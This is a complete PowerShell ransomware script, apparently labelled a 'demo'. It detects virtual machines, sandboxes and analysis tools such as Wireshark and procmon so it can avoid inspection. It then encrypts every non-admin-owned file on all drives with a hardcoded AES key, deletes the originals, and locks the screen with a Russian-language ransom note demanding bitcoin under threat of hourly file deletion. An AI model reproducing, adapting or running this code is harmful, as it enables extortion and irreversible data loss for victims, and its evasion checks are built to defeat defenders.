# Function to detect VM/Sandbox environments
function Detect-VM-Sandbox {
    # Check for VM artifacts
    $VMArtifacts = @(
        "C:\Program Files\VMware",
        "C:\Program Files\Oracle\VirtualBox",
        "C:\Program Files\Hyper-V",
        "HKLM:\SOFTWARE\VMware, Inc.",
        "HKLM:\SOFTWARE\Oracle\VirtualBox"
    )

    foreach ($Artifact in $VMArtifacts) {
        if (Test-Path -Path $Artifact) {
            Write-Host "VM detected: $Artifact"
            return $true
        }
    }

    # Check for sandbox processes
    $SandboxProcesses = @("sbiesvc", "cuckoo", "wireshark", "procmon")
    $RunningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName

    foreach ($Process in $SandboxProcesses) {
        if ($RunningProcesses -contains $Process) {
            Write-Host "Sandbox detected: $Process"
            return $true
        }
    }

    # Check for low system resources
    $CPUCount = (Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors
    $TotalRAM = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB

    if ($CPUCount -lt 2 -or $TotalRAM -lt 2) {
        Write-Host "Low system resources detected (VM/Sandbox likely)"
        return $true
    }

    # Check for user activity
    $LastInputTime = (Get-WmiObject Win32_Process | Where-Object { $_.Name -eq "explorer.exe" }).CreationDate
    $CurrentTime = Get-Date

    if (($CurrentTime - $LastInputTime).TotalMinutes -gt 5) {
        Write-Host "No user activity detected (Sandbox likely)"
        return $true
    }

    # Check for debugging tools
    $DebuggingTools = @("procmon", "wireshark", "ollydbg", "idaq")
    foreach ($Tool in $DebuggingTools) {
        if ($RunningProcesses -contains $Tool) {
            Write-Host "Debugging tool detected: $Tool"
            return $true
        }
    }

    # Check for low CPU usage
    $CPUUsage = (Get-WmiObject Win32_Processor).LoadPercentage
    if ($CPUUsage -lt 10) {
        Write-Host "Low CPU usage detected (Sandbox likely)"
        return $true
    }

    # Check for system uptime
    $SystemUptime = (Get-WmiObject Win32_OperatingSystem).LastBootUpTime
    if (($CurrentTime - $SystemUptime).TotalHours -lt 1) {
        Write-Host "System uptime is too short (Sandbox likely)"
        return $true
    }

    return $false
}

# AES Encryption Function Using a Hardcoded Key
function Encrypt-File {
    param (
        [string]$FilePath,
        [byte[]]$Key
    )

    try {
        # Read the file's content
        $FileContent = [System.IO.File]::ReadAllBytes($FilePath)

        # Initialize AES with CryptoAPI
        $AES = [System.Security.Cryptography.Aes]::Create()
        $AES.Key = $Key
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        # Generate a random Initialization Vector (IV) for each file
        $AES.GenerateIV()
        $IV = $AES.IV

        # Encrypt the file's content
        $Encryptor = $AES.CreateEncryptor()
        $EncryptedContent = $Encryptor.TransformFinalBlock($FileContent, 0, $FileContent.Length)

        # Combine IV and encrypted content for storage
        $Output = @($IV + $EncryptedContent)

        # Change the file extension to `.encrypted`
        $EncryptedPath = [System.IO.Path]::ChangeExtension($FilePath, ".encrypted")
        [System.IO.File]::WriteAllBytes($EncryptedPath, $Output)

        # Delete the original file
        Remove-Item -Path $FilePath -Force

        Write-Host "Encrypted: ${FilePath} -> ${EncryptedPath} (original file deleted)"
    } catch {
        Write-Host "Error encrypting ${FilePath}: $_"
    }
}

# Convert the Key String to a Byte Array (Ensure it's 32 bytes for AES-256)
function Get-AESKey {
    param (
        [string]$KeyString
    )
    # Ensure the key is 32 bytes for AES-256
    $KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($KeyString)
    if ($KeyBytes.Length -lt 32) {
        # Pad the key with zeros if it's shorter than 32 bytes
        $KeyBytes += @(0) * (32 - $KeyBytes.Length)
    } elseif ($KeyBytes.Length -gt 32) {
        # Truncate the key if it's longer than 32 bytes
        $KeyBytes = $KeyBytes[0..31]
    }
    return $KeyBytes
}

# Check if a file is owned by a non-administrator user
function Is-NonAdmin-Owned {
    param (
        [string]$FilePath
    )
    try {
        # Get the file's owner
        $FileOwner = (Get-Acl -Path $FilePath).Owner

        # Check if the owner is not an administrator or SYSTEM
        if ($FileOwner -notmatch "Administrators" -and $FileOwner -notmatch "SYSTEM") {
            return $true
        }
    } catch {
        Write-Host "Error checking owner of ${FilePath}: $_"
    }
    return $false
}

# Scan and Encrypt Files in a Directory (Exclude System Files and Admin-Owned Files)
function Scan-And-Encrypt-Directory {
    param (
        [string]$DirectoryPath,
        [byte[]]$Key
    )

    # List of system file extensions to exclude
    $SystemFileExtensions = @(".dll", ".sys", ".exe", ".ini", ".bat", ".cmd", ".msi", ".drv", ".ocx", ".scr", ".cpl", ".tmp", ".log")

    try {
        # Get all files recursively from the specified directory
        $Files = Get-ChildItem -Path $DirectoryPath -Recurse -File -ErrorAction SilentlyContinue
        foreach ($File in $Files) {
            # Skip system file extensions
            if ($SystemFileExtensions -contains $File.Extension) {
                Write-Host "Skipping system file: $($File.FullName)"
                continue
            }

            # Skip files owned by administrators or SYSTEM
            if (-not (Is-NonAdmin-Owned -FilePath $File.FullName)) {
                Write-Host "Skipping admin-owned file: $($File.FullName)"
                continue
            }

            # Encrypt the file
            Write-Host "Encrypting file: $($File.FullName)"
            Encrypt-File -FilePath $File.FullName -Key $Key
        }
    } catch {
        Write-Host "Error accessing directory ${DirectoryPath}: $_"
    }
}

# Encrypt Everything Created by Non-Administrator Users Across All Partitions
function Encrypt-NonAdmin-Files-All-Partitions {
    param (
        [byte[]]$Key
    )

    # Retrieve all logical drives
    $Drives = [System.IO.DriveInfo]::GetDrives()

    foreach ($Drive in $Drives) {
        # Skip drives that aren't ready (e.g., CD-ROM without media)
        if (-not $Drive.IsReady) {
            Write-Host "Skipping unready drive: $($Drive.Name)"
            continue
        }

        # Start the scan and encryption process for the current drive
        $DriveLetter = $Drive.RootDirectory.FullName.TrimEnd('\')  # e.g., "C:", "D:"
        Write-Host "Scanning drive: $DriveLetter"
        Scan-And-Encrypt-Directory -DirectoryPath $DriveLetter -Key $Key
    }
}

# Lock the screen and display a ransom note
function Lock-Screen-And-Show-Ransom-Note {
    # Ransom note message
$RansomNote = @"
===========================================
= Файлы вашего компьютера зашифрованы.     =
= Ваши фотографии, видео, документы и т. д. =
= Но не волнуйтесь! Я их еще не удалил.     =
= У вас есть 24 часа, чтобы заплатить      =
= 150 долларов США в биткойнах, чтобы      =
= получить ключ дешифрования.              =
= Каждый час файлы будут удаляться.        =
= Каждый раз сумма увеличивается.          =
= Спустя 72 часа все это                   =
= Мы свяжемся с вами в ближайшее время!!   =
===========================================
"@


    # Create a full-screen WPF window to display the ransom note
    Add-Type -AssemblyName PresentationFramework
    $Window = New-Object Windows.Window
    $Window.Title = "Ransomware Demo"
    $Window.WindowStyle = "None"
    $Window.WindowState = "Maximized"
    $Window.Topmost = $true
    $Window.Background = "Black"
    $Window.Foreground = "Red"
    $Window.FontSize = 12

    $TextBlock = New-Object Windows.Controls.TextBlock
    $TextBlock.Text = $RansomNote
    $TextBlock.Foreground = "White"
    $TextBlock.TextAlignment = "Center"
    $TextBlock.VerticalAlignment = "Center"
    $TextBlock.HorizontalAlignment = "Center"

    $Window.Content = $TextBlock
    $Window.ShowDialog() | Out-Null
}

# Start the encryption process for non-admin files across all partitions
function Start-Encryption-NonAdmin-Files-All-Partitions {
    # Hardcoded Key (Convert to Byte Array)
    $Key = Get-AESKey -KeyString "THisADEmoKeyMustBe32BytesLong1234"  # Ensure the key is 32 bytes long

    # Start the encryption process for non-admin files across all partitions
    Write-Host "Encrypting files created by non-administrator users across all partitions..."
    Encrypt-NonAdmin-Files-All-Partitions -Key $Key

    # Lock the screen and display the ransom note
    Lock-Screen-And-Show-Ransom-Note
}

# Exit if VM or sandbox is detected
if (Detect-VM-Sandbox) {
    Write-Host "Exiting script due to VM/Sandbox detection."
    exit
}

# Start the encryption process
Start-Encryption-NonAdmin-Files-All-Partitions
